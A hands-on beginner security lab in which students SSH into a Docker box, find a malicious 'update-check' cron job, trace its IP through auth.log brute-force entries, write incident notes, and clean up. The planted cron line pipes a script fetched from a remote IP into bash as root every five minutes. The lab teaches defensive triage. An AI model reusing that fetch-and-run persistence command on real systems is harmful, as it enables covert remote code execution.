# Terminal + SSH Lab: Part 2 — Apply: SSH In and Investigate a Box

[*(back to home)*](https://github.com/codepath/opencyber-terminal-lab)

Lab Parts:

0. [Setup: Get into the shell](./lab_part0.md)
1. [Learn: Get on a Box with a Key and Get Oriented](./lab_part1.md)
2. [Apply: SSH In and Investigate a Box](./lab_part2.md) (✅ You are here!)
3. [Challenge: Access and Triage a New Box](./lab_part3.md)

## Part 2 | Apply: SSH In and Investigate a Box

**Estimated Time:** 45 minutes

**Environment:** Our provided Docker container (see [Part 0](./lab_part0.md) for setup instructions)

**Tools Needed:** `ssh`, `ls`, `cd`, `cat`, `mkdir`, `touch`, `mv`, `rm`, `grep`, `find`, `tree` (already installed for you)

**[Back to home](https://github.com/codepath/opencyber-terminal-lab)**

## Overview

Time to put the Part 1 toolkit to work on a real task. You'll use your key to log into the `webadmin` server, then take it over: it's a machine someone else used and left in a mess. Your job has two halves that mirror how a security analyst actually starts on an unfamiliar system:

1. **Orient** — look around and figure out what's here (and what's *wrong*) before you change anything.
2. **Triage** — put things in order, clean up the junk, and flag what's suspicious.

The orient half is guided — it teaches the core investigative move. The triage half gives you the **goal** and a menu of commands, and asks you to try it yourself before you peek at the full walkthrough. That "try first" habit is what Part 3 will lean on entirely.

> [!TIP]
> The golden rule of triage: **read before you delete.** Understand what something is before you remove it. You'll see why partway through.

## Instructions

### Step 1: SSH into the box and orient yourself

- [ ] From your workstation, log into the `webadmin` server with your key — **on your own this time.** You did this in Part 1; rebuild the command from what you know: log in as user `webadmin` on `localhost`, pointing `ssh` at the key `~/keys/webadmin_key` (recall the flag that selects a specific key). If you need the exact form, it's in Part 1, Step 4.

  No password prompt — the key gets you in. Everything from here happens **on the webadmin box**, in that account's home directory (run `pwd` if you want to confirm you're in `/home/webadmin`).

- [ ] Survey the box with `tree`:

  ```bash
  tree
  ```

  You'll see loose files at the top level, a `logs/` folder, and a `tmp/` folder.

- [ ] `tree` hides dotfiles by default. Files whose names start with a dot are **hidden** — list everything, including them, with `ls -a`:

  ```bash
  ls -a
  ```

  <details>
  <summary>✅ Check your result</summary>

  ```text
  .  ..  .bash_logout  .bashrc  .cache  .profile  .ssh  .todo  README-FIRST.txt  headshot.jpg  logo.png.bak  logs  meeting-notes.txt  q3-report.txt  tmp  update-check.cron
  ```

  Most of those dotfiles (`.bashrc`, `.profile`, `.ssh`, …) are standard account files every Linux home has — not part of the mess, and you leave them alone. The one that stands out is **`.todo`**: a hidden personal note the previous user left. It didn't show up in a plain `ls` or `tree`. Hidden files are exactly where people (and attackers) stash things they'd rather you not notice.

  </details>

  Two handy variants once you're comfortable: `ls -al` adds the detailed long view (permissions, owner, size), and `tree -a` redraws the branching diagram *with* the hidden files — run them side by side to see what each shows.

- [ ] Read the handoff note first — it tells you what the previous user left behind and what the box should look like when you're done:

  ```bash
  cat README-FIRST.txt
  ```

- [ ] Read the human-written files to understand the state of the box. The meeting notes and the hidden `.todo` both hint that something scheduled is running that nobody meant to add:

  ```bash
  cat meeting-notes.txt
  cat .todo
  ```

- [ ] Follow the hint: scheduled jobs on Linux live in "cron" files. Read the cron file on this box and decide whether it looks legitimate:

  ```bash
  cat update-check.cron
  ```

  It's a scheduled job that downloads and runs a script from a numeric address every five minutes — a classic persistence trick dressed up as an "update check." **Note the IP address in it.**

- [ ] Confirm the suspicion with the pivot you previewed in Part 1: take that one indicator (the IP) and `grep` the whole box for it to see everywhere it appears. Run it, then check the reveal:

  ```bash
  grep -rn "185.220.101.47" .
  ```

  <details>
  <summary>✅ Check your result</summary>

  ```text
  ./logs/auth.log:4:Aug 13 03:17:48 box sshd[2044]: Failed password for root from 185.220.101.47 port 60122 ssh2
  ./logs/auth.log:5:Aug 13 03:17:51 box sshd[2044]: Failed password for root from 185.220.101.47 port 60122 ssh2
  ./logs/auth.log:6:Aug 13 03:18:05 box sshd[2051]: Accepted password for root from 185.220.101.47 port 60140 ssh2
  ./logs/auth.log:7:Aug 13 03:19:32 box sshd[2051]: Accepted publickey for root from 185.220.101.47 port 60155 ssh2
  ./update-check.cron:2:*/5 * * * * root curl -s http://185.220.101.47/u.sh | bash
  ```

  The address from the malicious scheduled job is all over the auth log: two **failed** root logins, then a **successful** one at 03:18 — a brute-force that worked — and moments later the attacker adds their *own* SSH key (`Accepted publickey`). One indicator ties the whole story together: that's your smoking gun.

  </details>

> [!NOTE]
> This is exactly how real triage works: find one odd thing, then `grep` for it to see everywhere else it shows up. One indicator (here, an IP) connects the dots. You'll do this *without* the step-by-step in Part 3.

🎯 **Checkpoint 2.1**: You SSH'd into the box and can describe what's on it and what's out of place — the suspicious scheduled job and the matching root login.

### Step 2: Triage — organize and clean up (try it yourself first)

Now bring the box into the order the handoff note asked for. **The `README-FIRST.txt` you just read spells out the exact target layout** — that's your goal. Try to reach it yourself using the Part 1 toolkit plus the commands in the menu below; only open the full walkthrough if you get stuck.

**The goal:** create `documents/` and `images/` folders; move the two document files and the image into them; fix the mislabeled `logo.png.bak` (it's really the logo); write your findings into a new `incident-notes.txt`; and delete the `tmp/` junk plus the malicious cron file *once you've documented it*. Leave `README-FIRST.txt` and `logs/` where they are.

First, the one move you haven't done yet — **writing to a file** (you'll use it here to record findings, and again in Part 3):

- [ ] Create your findings file and add a line to it:

  ```bash
  touch incident-notes.txt
  echo "Malicious cron job beacons to 185.220.101.47 every 5 minutes." >> incident-notes.txt
  cat incident-notes.txt
  ```

  `touch` makes an empty file, and `echo "text" >> file` **appends** a line to it (the `>>` adds without erasing what's already there). The `cat` at the end prints the file back so you can *see* your line landed. Prefer an editor? `nano incident-notes.txt` opens it (save with `Ctrl+O` then Enter, exit with `Ctrl+X`). Add a second line noting the matching root login you found in `auth.log`, and `cat` it again to confirm both lines are there.

Now bring the rest of the box into order — try it with the toolkit below before opening the walkthrough:

<details>
<summary>🧰 Commands you'll want (expand each for how it's used)</summary>

- **`mkdir <name>`** — make a directory. You can make several at once: `mkdir a b`.
- **`mv <source> <destination>`** — move a file into a folder: `mv file.txt folder/`. `mv` also **renames** — `mv oldname newname` — so it fixes the mislabeled file too.
- **`touch <name>`** — create a new empty file. Edit it with `nano <name>` (save `Ctrl+O`, Enter; exit `Ctrl+X`), or append a line from the shell with `echo "text" >> file`.
- **`rm <name>`** — delete a file. `rm -r <folder>` deletes a folder and everything in it ("recursive").

</details>

> [!WARNING]
> `rm` is permanent — there is no recycle bin on the command line, and it never asks "are you sure?" Double-check the name before you press Enter. This is why you read everything first: you don't want to `rm` the file that turned out to be evidence.
>
> The stakes only climb from here. `sudo rm -rf` pointed at the wrong path can delete the operating system itself, and Linux will not stop you, warn you, or ask you to confirm — it will just do exactly what you told it to. In this Docker lab that's survivable — reset to a clean box by typing `exit` **twice**: once to leave the `webadmin` server (back to your `student` workstation), then once more to leave the container entirely. Re-run the image and you're on a fresh box. A real machine will not forgive it.

<details>
<summary>📋 Full walkthrough (open if you get stuck)</summary>

```bash
# make the two folders
mkdir documents images

# sort the loose files
mv meeting-notes.txt q3-report.txt documents/
mv headshot.jpg images/

# fix the mislabeled logo as you move it
mv logo.png.bak images/logo.png

# record what you found
touch incident-notes.txt
echo "Malicious cron job downloads/runs a script from 185.220.101.47 every 5 min." >> incident-notes.txt
echo "Same IP has an 'Accepted password for root' entry in logs/auth.log at 03:18." >> incident-notes.txt

# delete the junk, then remove the malicious file now that it's documented
rm -r tmp
rm update-check.cron
```

</details>

🎯 **Checkpoint 2.2**: The box is organized, the junk is gone, the malicious cron file is documented and removed, and your findings are written down.

### Step 3: Confirm your work

- [ ] Re-run `tree` and compare against the target layout in `README-FIRST.txt`:

  ```bash
  tree
  ```

  <details>
  <summary>✅ Check your result</summary>

  ```text
  .
  |-- README-FIRST.txt
  |-- documents
  |   |-- meeting-notes.txt
  |   `-- q3-report.txt
  |-- images
  |   |-- headshot.jpg
  |   `-- logo.png
  |-- incident-notes.txt
  `-- logs
      |-- access.log
      `-- auth.log
  ```

  If your `tree` matches this, you're done. Comparing your result to the target is exactly how you'll grade yourself in Part 3.

  </details>

- [ ] The `.todo` file is still there (it's hidden, so plain `tree` doesn't show it). Confirm with `ls -a` — or `tree -a`, which redraws the diagram *with* hidden files so you can see exactly what plain `tree` was leaving out. Decide for yourself whether `.todo` belongs — it's the previous user's personal reminder list. Leaving it or removing it are both defensible; the point is that you *saw* it.

🎯 **Checkpoint 2.3**: Your box layout matches the target in `README-FIRST.txt`.

### Step 4: Spot the second foothold (optional stretch)

The cron job is *one* way the attacker kept a grip on this box. Read the `auth.log` entries for the attacker's IP again, closely, and connect them to what you learned about SSH keys in Part 1: moments after the brute-force succeeded, they did one more thing to guarantee they could get back in even if the password were changed. What did they do — and why is it harder to shut down than the cron job? (You already have every line you need in your Step 1 `grep` output; this is about *reading* it, not running anything new.)

With the box in order, you're ready for the challenge. Log out of `webadmin` with `exit` when you're done. In [Part 3](./lab_part3.md), you'll SSH into a **new** box on your own — no step-by-step — and triage it start to finish.
